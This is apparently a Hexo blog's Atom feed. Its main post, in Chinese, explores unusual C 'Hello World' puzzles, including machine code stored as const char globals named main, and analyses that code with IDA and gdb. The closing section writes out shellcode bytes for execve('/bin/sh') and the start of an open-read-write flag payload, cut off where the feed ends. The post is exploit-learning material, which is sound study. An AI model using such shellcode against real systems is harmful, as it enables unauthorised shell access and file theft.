<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>nocbtm&#39;s Blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://nocbtm.github.io/"/>
  <updated>2020-05-11T13:36:10.997Z</updated>
  <id>https://nocbtm.github.io/</id>
  
  <author>
    <name>nocbtm</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>gcc编译器和clang编译器的对比分析</title>
    <link href="https://nocbtm.github.io/2020/05/11/gcc%E7%BC%96%E8%AF%91%E5%99%A8%E5%92%8Cclang%E7%BC%96%E8%AF%91%E5%99%A8%E7%9A%84%E5%AF%B9%E6%AF%94%E5%88%86%E6%9E%90/"/>
    <id>https://nocbtm.github.io/2020/05/11/gcc编译器和clang编译器的对比分析/</id>
    <published>2020-05-11T13:36:10.000Z</published>
    <updated>2020-05-11T13:36:10.997Z</updated>
    
    <summary type="html">
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>一种新的动态链接方式</title>
    <link href="https://nocbtm.github.io/2020/05/08/%E4%B8%80%E7%A7%8D%E6%96%B0%E7%9A%84%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E6%96%B9%E5%BC%8F/"/>
    <id>https://nocbtm.github.io/2020/05/08/一种新的动态链接方式/</id>
    <published>2020-05-08T04:20:22.000Z</published>
    <updated>2020-05-11T14:02:11.521Z</updated>
    
    <content type="html"><![CDATA[<script src="/crypto-js.js"></script><script src="/mcommon.js"></script><h3 id="encrypt-message">该文章被加密了，请联系管理员请求密码.</h3><link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap.min.css"> <link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap-theme.min.css"> <script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script> <script src="//cdn.bootcss.com/bootstrap/3.3.5/js/bootstrap.min.js"></script> <div id="security"> <div> <div class="input-group"> <input type="text" class="form-control" aria-label="Enter the password." id="pass"/> <div class="input-group-btn"> <button type="button" class="btn btn-default" onclick="decryptAES()">Decrypt</button> </div> </div> </div> </div> <div id="encrypt-blog" style="display:none"> U2FsdGVkX19IGyVwkEmTVFReYApM3eQi5cfE2gKM8wk= </div>]]></content>
    
    <summary type="html">
    
      The article has been encrypted, please enter your password to view.&lt;br&gt;
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>对hello world的重新认识</title>
    <link href="https://nocbtm.github.io/2020/05/08/%E5%AF%B9hello-world%E7%9A%84%E9%87%8D%E6%96%B0%E8%AE%A4%E8%AF%86/"/>
    <id>https://nocbtm.github.io/2020/05/08/对hello-world的重新认识/</id>
    <published>2020-05-08T02:07:19.000Z</published>
    <updated>2020-05-08T04:11:22.268Z</updated>
    
    <content type="html"><![CDATA[<p> 前段时间在逛知乎的时候，偶然发现一道有意思的编程题<br><img alt="知乎" data-src="https://image-1251466963.cos.ap-chengdu.myqcloud.com/qiniu/7hf2r1wl6noec3akgedgzpbqsq.png" class="lozad"><br>参考链接：<a href="https://www.zhihu.com/question/66088898/answer/238036040" target="_blank" rel="noopener">hello world编程题你会吗？</a><br> Helllo World算是最简单也最基础的程序了，我们一般在编写c语言代码的时候，输入输出都会很自然地联想到frintf()和scanf()，这几道题非常地有意思，要求跳出常规思维输出’’Hello World’。</p><h2 id="1-不用-“-“-输出Hello-World！"><a href="#1-不用-“-“-输出Hello-World！" class="headerlink" title="1.不用 “ “ 输出Hello,World！"></a>1.不用 “ “ 输出Hello,World！</h2><p> 不用” “输出，那么就不能用scanf()这个函数了，那么怎么办呢，想到c语言在处理字符常量的时候是把它当做数字来处理的，所以可以用普通char()函数把”Hello World”的每个字符的Ascii码输出。<br> 这道题如果引伸为不用引号来输出(单引号和双引号都不能使用),其实也是一样的，putchar()函数可以直接用数字作为参数。</p><h2 id="2-不用-输出Hello，World！"><a href="#2-不用-输出Hello，World！" class="headerlink" title="2.不用 ; 输出Hello，World！"></a>2.不用 ; 输出Hello，World！</h2><p> 不用;输出，也就是出代码中不能出现完整的语句，仔细思考下在c语言当中哪些位置可以不用;的，发现if语句刚好满足要求。</p><p>附上同时满足条件1和2的程序代码:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> ()</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">putchar</span>(<span class="number">72</span>))&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">putchar</span>(<span class="number">101</span>))&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">putchar</span>(<span class="number">108</span>))&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">putchar</span>(<span class="number">108</span>))&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">putchar</span>(<span class="number">111</span>))&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">putchar</span>(<span class="number">32</span>))&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">putchar</span>(<span class="number">87</span>))&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">putchar</span>(<span class="number">111</span>))&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">putchar</span>(<span class="number">114</span>))&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">putchar</span>(<span class="number">108</span>))&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">putchar</span>(<span class="number">100</span>))&#123;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> 这里需要说明的一点是，在最新的c标准中，已经不允许main函数的类型为void。</p><h2 id="3-不用-输出Hello-World！"><a href="#3-不用-输出Hello-World！" class="headerlink" title="3.不用# 输出Hello,World！"></a>3.不用# 输出Hello,World！</h2><p> 这道题不得不感叹自己所学的知识的贫瘠，一直想着怎么在windows编译环境下怎么达到这个条件，看了原帖的回复，说是要重新定义printf()函数，然后在dev里试了试重新定义了一下printf函数，发现报错没有定义printf()这个函数。<br> 后来才发现原来重新定义printf()函数在linux环境下是可以实现要求的。</p><p><img alt="img" data-src="https://image-1251466963.cos.ap-chengdu.myqcloud.com/qiniu/dl53pg26qconiqrkjv1b43o1g7.png" class="lozad"></p><p>代码如下:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">printf</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *format,...)</span></span>;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">int</span> ()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">"hello, world"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="4-不用括号输出Hello-World！-包括各种括号-，-lt-gt-，｛｝，［］都不能用"><a href="#4-不用括号输出Hello-World！-包括各种括号-，-lt-gt-，｛｝，［］都不能用" class="headerlink" title="4.不用括号输出Hello,World！(包括各种括号()，&lt;&gt;，｛｝，［］都不能用 )"></a>4.不用括号输出Hello,World！(包括各种括号()，&lt;&gt;，｛｝，［］都不能用 )</h2><p> 第四题出题人并不是为了输出”Hello World”出的题，本意在了解ELF文件格式。<br>附上知乎大佬的代码:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> main = <span class="number">0x55</span>, main1 = <span class="number">0x48</span>, main2 = <span class="number">0x89</span>, main3 = <span class="number">0xe5</span>, main4 = <span class="number">0xb8</span>,</span><br><span class="line">           main5 = <span class="number">0x01</span>, main6 = <span class="number">0x00</span>, main7 = <span class="number">0x00</span>, main8 = <span class="number">0x00</span>, main9 = <span class="number">0xbb</span>,</span><br><span class="line">           main10 = <span class="number">0x01</span>, main11 = <span class="number">0x00</span>, main12 = <span class="number">0x00</span>, main13 = <span class="number">0x00</span>,</span><br><span class="line">           main14 = <span class="number">0x67</span>, main15 = <span class="number">0x8d</span>, main16 = <span class="number">0x35</span>, main17 = <span class="number">0x10</span>,</span><br><span class="line">           main18 = <span class="number">0x00</span>, main19 = <span class="number">0x00</span>, main20 = <span class="number">0x00</span>, main21 = <span class="number">0xba</span>,</span><br><span class="line">           main22 = <span class="number">0x0d</span>, main23 = <span class="number">0x00</span>, main24 = <span class="number">0x00</span>, main25 = <span class="number">0x00</span>,</span><br><span class="line">           main26 = <span class="number">0x0f</span>, main27 = <span class="number">0x05</span>, main28 = <span class="number">0xb8</span>, main29 = <span class="number">0x3c</span>,</span><br><span class="line">           main30 = <span class="number">0x00</span>, main31 = <span class="number">0x00</span>, main32 = <span class="number">0x00</span>, main33 = <span class="number">0x31</span>,</span><br><span class="line">           main34 = <span class="number">0xdb</span>, main35 = <span class="number">0x0f</span>, main36 = <span class="number">0x05</span>, main37 = <span class="number">0x48</span>,</span><br><span class="line">           main38 = <span class="number">0x65</span>, main39 = <span class="number">0x6c</span>, main40 = <span class="number">0x6c</span>, main41 = <span class="number">0x6f</span>,</span><br><span class="line">           main42 = <span class="number">0x20</span>, main43 = <span class="number">0x57</span>, main44 = <span class="number">0x6f</span>, main45 = <span class="number">0x72</span>,</span><br><span class="line">           main46 = <span class="number">0x6c</span>, main47 = <span class="number">0x64</span>, main48 = <span class="number">0x21</span>, main49 = <span class="number">0x0a</span>,</span><br><span class="line">           main50 = <span class="number">0x5d</span>;</span><br></pre></td></tr></table></figure><h2 id="5-对上述代码的分析"><a href="#5-对上述代码的分析" class="headerlink" title="5.对上述代码的分析"></a>5.对上述代码的分析</h2><p>其中最让我不能理解的是第四种方式输出的Hello ,World!</p><p>我用gcc编译器，把他编译后运行，的确能输出Hello ,World!</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">➜   gcc test.c -o <span class="built_in">test</span></span><br><span class="line">➜   ./<span class="built_in">test</span></span><br><span class="line">Hello World!</span><br></pre></td></tr></table></figure><p>用ida反编译一下，可以看到start函数还是很正常的，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000004003E0 _start          proc near               ; DATA XREF: LOAD:0000000000400018↑o</span><br><span class="line">.text:00000000004003E0 ; __unwind &#123;</span><br><span class="line">.text:00000000004003E0                 xor     ebp, ebp</span><br><span class="line">.text:00000000004003E2                 mov     r9, rdx         ; rtld_fini</span><br><span class="line">.text:00000000004003E5                 pop     rsi             ; argc</span><br><span class="line">.text:00000000004003E6                 mov     rdx, rsp        ; ubp_av</span><br><span class="line">.text:00000000004003E9                 and     rsp, 0FFFFFFFFFFFFFFF0h</span><br><span class="line">.text:00000000004003ED                 push    rax</span><br><span class="line">.text:00000000004003EE                 push    rsp             ; stack_end</span><br><span class="line">.text:00000000004003EF                 mov     r8, offset __libc_csu_fini ; fini</span><br><span class="line">.text:00000000004003F6                 mov     rcx, offset __libc_csu_init ; init</span><br><span class="line">.text:00000000004003FD                 mov     rdi, offset main ; main</span><br><span class="line">.text:0000000000400404                 call    ___libc_start_main</span><br><span class="line">.text:0000000000400409                 hlt</span><br><span class="line">.text:0000000000400409 ; &#125; // starts at 4003E0</span><br><span class="line">.text:0000000000400409 _start          endp</span><br><span class="line">.text:0000000000400409</span><br></pre></td></tr></table></figure><p>继续看main函数,就变得很不正常了，而且他是在data段。？？？</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line">.rodata:0000000000400564 ; int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">.rodata:0000000000400564 main            db  55h ; U             ; DATA XREF: _start+1D↑o</span><br><span class="line">.rodata:0000000000400565                 public main1</span><br><span class="line">.rodata:0000000000400565 main1           db  48h ; H</span><br><span class="line">.rodata:0000000000400566                 public main2</span><br><span class="line">.rodata:0000000000400566 main2           db  89h</span><br><span class="line">.rodata:0000000000400567                 public main3</span><br><span class="line">.rodata:0000000000400567 main3           db 0E5h</span><br><span class="line">.rodata:0000000000400568                 public main4</span><br><span class="line">.rodata:0000000000400568 main4           db 0B8h</span><br><span class="line">.rodata:0000000000400569                 public main5</span><br><span class="line">.rodata:0000000000400569 main5           db    1</span><br><span class="line">.rodata:000000000040056A                 public main6</span><br><span class="line">.rodata:000000000040056A main6           db    0</span><br><span class="line">.rodata:000000000040056B                 public main7</span><br><span class="line">.rodata:000000000040056B main7           db    0</span><br><span class="line">.rodata:000000000040056C                 public main8</span><br><span class="line">.rodata:000000000040056C main8           db    0</span><br><span class="line">.rodata:000000000040056D                 public main9</span><br><span class="line">.rodata:000000000040056D main9           db 0BBh</span><br><span class="line">.rodata:000000000040056E                 public main10</span><br><span class="line">.rodata:000000000040056E main10          db    1</span><br><span class="line">.rodata:000000000040056F                 public main11</span><br><span class="line">.rodata:000000000040056F main11          db    0</span><br><span class="line">.rodata:0000000000400570                 public main12</span><br><span class="line">.rodata:0000000000400570 main12          db    0</span><br><span class="line">.rodata:0000000000400571                 public main13</span><br><span class="line">.rodata:0000000000400571 main13          db    0</span><br><span class="line">.rodata:0000000000400572                 public main14</span><br><span class="line">.rodata:0000000000400572 main14          db  67h ; g</span><br><span class="line">.rodata:0000000000400573                 public main15</span><br><span class="line">.rodata:0000000000400573 main15          db  8Dh</span><br><span class="line">.rodata:0000000000400574                 public main16</span><br><span class="line">.rodata:0000000000400574 main16          db  35h ; 5</span><br><span class="line">.rodata:0000000000400575                 public main17</span><br><span class="line">.rodata:0000000000400575 main17          db  10h</span><br><span class="line">.rodata:0000000000400576                 public main18</span><br><span class="line">.rodata:0000000000400576 main18          db    0</span><br><span class="line">.rodata:0000000000400577                 public main19</span><br><span class="line">.rodata:0000000000400577 main19          db    0</span><br><span class="line">.rodata:0000000000400578                 public main20</span><br><span class="line">.rodata:0000000000400578 main20          db    0</span><br><span class="line">.rodata:0000000000400579                 public main21</span><br><span class="line">.rodata:0000000000400579 main21          db 0BAh</span><br><span class="line">.rodata:000000000040057A                 public main22</span><br><span class="line">.rodata:000000000040057A main22          db  0Dh</span><br><span class="line">.rodata:000000000040057B                 public main23</span><br><span class="line">.rodata:000000000040057B main23          db    0</span><br><span class="line">.rodata:000000000040057C                 public main24</span><br><span class="line">.rodata:000000000040057C main24          db    0</span><br><span class="line">.rodata:000000000040057D                 public main25</span><br><span class="line">.rodata:000000000040057D main25          db    0</span><br><span class="line">.rodata:000000000040057E                 public main26</span><br><span class="line">.rodata:000000000040057E main26          db  0Fh</span><br><span class="line">.rodata:000000000040057F                 public main27</span><br><span class="line">.rodata:000000000040057F main27          db    5</span><br><span class="line">.rodata:0000000000400580                 public main28</span><br><span class="line">.rodata:0000000000400580 main28          db 0B8h</span><br><span class="line">.rodata:0000000000400581                 public main29</span><br><span class="line">.rodata:0000000000400581 main29          db  3Ch ; &lt;</span><br><span class="line">.rodata:0000000000400582                 public main30</span><br><span class="line">.rodata:0000000000400582 main30          db    0</span><br><span class="line">.rodata:0000000000400583                 public main31</span><br><span class="line">.rodata:0000000000400583 main31          db    0</span><br><span class="line">.rodata:0000000000400584                 public main32</span><br><span class="line">.rodata:0000000000400584 main32          db    0</span><br><span class="line">.rodata:0000000000400585                 public main33</span><br><span class="line">.rodata:0000000000400585 main33          db  31h ; 1</span><br><span class="line">.rodata:0000000000400586                 public main34</span><br><span class="line">.rodata:0000000000400586 main34          db 0DBh</span><br><span class="line">.rodata:0000000000400587                 public main35</span><br><span class="line">.rodata:0000000000400587 main35          db  0Fh</span><br><span class="line">.rodata:0000000000400588                 public main36</span><br><span class="line">.rodata:0000000000400588 main36          db    5</span><br><span class="line">.rodata:0000000000400589                 public main37</span><br><span class="line">.rodata:0000000000400589 main37          db  48h ; H</span><br><span class="line">.rodata:000000000040058A                 public main38</span><br><span class="line">.rodata:000000000040058A main38          db  65h ; e</span><br><span class="line">.rodata:000000000040058B                 public main39</span><br><span class="line">.rodata:000000000040058B main39          db  6Ch ; l</span><br><span class="line">.rodata:000000000040058C                 public main40</span><br><span class="line">.rodata:000000000040058C main40          db  6Ch ; l</span><br><span class="line">.rodata:000000000040058D                 public main41</span><br><span class="line">.rodata:000000000040058D main41          db  6Fh ; o</span><br><span class="line">.rodata:000000000040058E                 public main42</span><br><span class="line">.rodata:000000000040058E main42          db  20h</span><br><span class="line">.rodata:000000000040058F                 public main43</span><br><span class="line">.rodata:000000000040058F main43          db  57h ; W</span><br><span class="line">.rodata:0000000000400590                 public main44</span><br><span class="line">.rodata:0000000000400590 main44          db  6Fh ; o</span><br><span class="line">.rodata:0000000000400591                 public main45</span><br><span class="line">.rodata:0000000000400591 main45          db  72h ; r</span><br><span class="line">.rodata:0000000000400592                 public main46</span><br><span class="line">.rodata:0000000000400592 main46          db  6Ch ; l</span><br><span class="line">.rodata:0000000000400593                 public main47</span><br><span class="line">.rodata:0000000000400593 main47          db  64h ; d</span><br><span class="line">.rodata:0000000000400594                 public main48</span><br><span class="line">.rodata:0000000000400594 main48          db  21h ; !</span><br><span class="line">.rodata:0000000000400595                 public main49</span><br><span class="line">.rodata:0000000000400595 main49          db  0Ah</span><br><span class="line">.rodata:0000000000400596                 public main50</span><br><span class="line">.rodata:0000000000400596 main50          db  5Dh ; ]</span><br><span class="line">.rodata:0000000000400596 _rodata         ends</span><br></pre></td></tr></table></figure><p>接下来我用gdb动态调试一波,下断点到main函数的地方,</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; b *0x400564</span><br><span class="line">Breakpoint 2 at 0x400564</span><br><span class="line">pwndbg&gt; c</span><br><span class="line">Continuing.</span><br><span class="line"></span><br><span class="line">Breakpoint 2, 0x0000000000400564 in main ()</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">────────────────────────────────────────────[ REGISTERS ]────────────────────────────────────────────</span><br><span class="line"> RAX  0x400564 (main) ◂— push   rbp</span><br><span class="line"> RBX  0x0</span><br><span class="line"> RCX  0x0</span><br><span class="line"> RDX  0x7fffffffde28 —▸ 0x7fffffffe1df ◂— &apos;XDG_SEAT_PATH=/org/freedesktop/DisplayManager/Seat0&apos;</span><br><span class="line"> RDI  0x1</span><br><span class="line"> RSI  0x7fffffffde18 —▸ 0x7fffffffe1ac ◂— &apos;/mnt/hgfs/ubuntu_share/help/test&apos;</span><br><span class="line"> R8   0x400550 (__libc_csu_fini) ◂— ret    </span><br><span class="line"> R9   0x7ffff7de7ac0 (_dl_fini) ◂— push   rbp</span><br><span class="line"> R10  0x846</span><br><span class="line"> R11  0x7ffff7a2d740 (__libc_start_main) ◂— push   r14</span><br><span class="line"> R12  0x4003e0 (_start) ◂— xor    ebp, ebp</span><br><span class="line"> R13  0x7fffffffde10 ◂— 0x1</span><br><span class="line"> R14  0x0</span><br><span class="line"> R15  0x0</span><br><span class="line"> RBP  0x4004e0 (__libc_csu_init) ◂— push   r15</span><br><span class="line"> RSP  0x7fffffffdd38 —▸ 0x7ffff7a2d830 (__libc_start_main+240) ◂— mov    edi, eax</span><br><span class="line"> RIP  0x400564 (main) ◂— push   rbp</span><br><span class="line">─────────────────────────────────────────────[ DISASM ]──────────────────────────────────────────────</span><br><span class="line"> ► 0x400564 &lt;main&gt;      push   rbp &lt;0x4004e0&gt;</span><br><span class="line">   0x400565 &lt;main1&gt;     mov    rbp, rsp</span><br><span class="line">   0x400568 &lt;main4&gt;     mov    eax, 1</span><br><span class="line">   0x40056d &lt;main9&gt;     mov    ebx, 1</span><br><span class="line">   0x400572 &lt;main14&gt;    lea    esi, [eip + 0x10]</span><br><span class="line">   0x400579 &lt;main21&gt;    mov    edx, 0xd</span><br><span class="line">   0x40057e &lt;main26&gt;    syscall </span><br><span class="line">   0x400580 &lt;main28&gt;    mov    eax, 0x3c</span><br><span class="line">   0x400585 &lt;main33&gt;    xor    ebx, ebx</span><br><span class="line">   0x400587 &lt;main35&gt;    syscall </span><br><span class="line">   0x400589 &lt;main37&gt;    insb   byte ptr [rdi], dx</span><br><span class="line">──────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────</span><br><span class="line">00:0000│ rsp  0x7fffffffdd38 —▸ 0x7ffff7a2d830 (__libc_start_main+240) ◂— mov    edi, eax</span><br><span class="line">01:0008│      0x7fffffffdd40 ◂— 0x1</span><br><span class="line">02:0010│      0x7fffffffdd48 —▸ 0x7fffffffde18 —▸ 0x7fffffffe1ac ◂— &apos;/mnt/hgfs/ubuntu_share/help/test&apos;</span><br><span class="line">03:0018│      0x7fffffffdd50 ◂— 0x1f7ffcca0</span><br><span class="line">04:0020│      0x7fffffffdd58 —▸ 0x400564 (main) ◂— push   rbp</span><br><span class="line">05:0028│      0x7fffffffdd60 ◂— 0x0</span><br><span class="line">06:0030│      0x7fffffffdd68 ◂— 0x74c583ff1005bf92</span><br><span class="line">07:0038│      0x7fffffffdd70 —▸ 0x4003e0 (_start) ◂— xor    ebp, ebp</span><br><span class="line">────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────</span><br><span class="line"> ► f 0           400564 main</span><br><span class="line">   f 1     7ffff7a2d830 __libc_start_main+240</span><br><span class="line">Breakpoint *0x400564</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>看到这里我明白了，上述代码其实是一段shellcode，gcc编译器是如何识别并编译的，这里我不得而知，看来还要再看一遍程序员的自我修养啊。</p><p>分析一下生成的汇编吧。<code>0x400572 &lt;main14&gt;    lea    esi, [eip + 0x10]</code> 其中这段汇编让我很感兴趣，第一次见到用eip作为基址然后调整偏移来传参的,很显然里面存的是Hello world，然后syscall系统调用write函数输出，第二次syscall系统调用exit函数。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/10s 0x400579+0x10</span><br><span class="line">0x400589 &lt;main37&gt;:&quot;Hello World!\n]&quot;</span><br><span class="line">0x400598:&quot;\001\033\003;,&quot;</span><br><span class="line">0x40059e:&quot;&quot;</span><br><span class="line">0x40059f:&quot;&quot;</span><br><span class="line">0x4005a0:&quot;\004&quot;</span><br><span class="line">0x4005a2:&quot;&quot;</span><br><span class="line">0x4005a3:&quot;&quot;</span><br><span class="line">0x4005a4:&quot;\030\376\377\377x&quot;</span><br><span class="line">0x4005aa:&quot;&quot;</span><br><span class="line">0x4005ab:&quot;&quot;</span><br></pre></td></tr></table></figure><h2 id="6-模仿操作"><a href="#6-模仿操作" class="headerlink" title="6.模仿操作"></a>6.模仿操作</h2><p>用上述方式写 execve(“/bin/sh”)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="keyword">char</span>  main = <span class="number">0x6a</span>, main1 = <span class="number">0x42</span>, main2 = <span class="number">0x58</span>, main3 = <span class="number">0xfe</span>, main4 = <span class="number">0xc4</span>, main5 = <span class="number">0x48</span>, main6 = <span class="number">0x99</span>, main7 = <span class="number">0x52</span>, main8 = <span class="number">0x48</span>, main9 = <span class="number">0xbf</span>,main10 = <span class="number">0x2f</span>, main11 = <span class="number">0x62</span>, main12 = <span class="number">0x69</span>, main13 = <span class="number">0x6e</span>, main14 = <span class="number">0x2f</span>, main15 = <span class="number">0x2f</span>, main16 = <span class="number">0x73</span>, main17 = <span class="number">0x68</span>, main18 = <span class="number">0x57</span>, main19 = <span class="number">0x54</span>,main20 = <span class="number">0x5e</span>, main21 = <span class="number">0x49</span>, main22 = <span class="number">0x89</span>, main23 = <span class="number">0xd0</span>, main24 = <span class="number">0x49</span>, main25 = <span class="number">0x89</span>, main26 = <span class="number">0xd2</span>, main27 = <span class="number">0x0f</span>, main28 = <span class="number">0x05</span>;</span><br></pre></td></tr></table></figure><p>orw flag</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> main=<span class="number">0x48</span>,main1=<span class="number">0xb8</span>,main2=<span class="number">0x1</span>,main3=<span class="number">0x1</span>,main4=<span class="number">0x1</span>,main5=<span class="number">0x1</span>,main6=<span class="number">0x1</span>,main7=<span class="number">0x1</span>,main8=<span class="number">0x1</span>,main9=<span class="number">0x1</span>,main10=<span 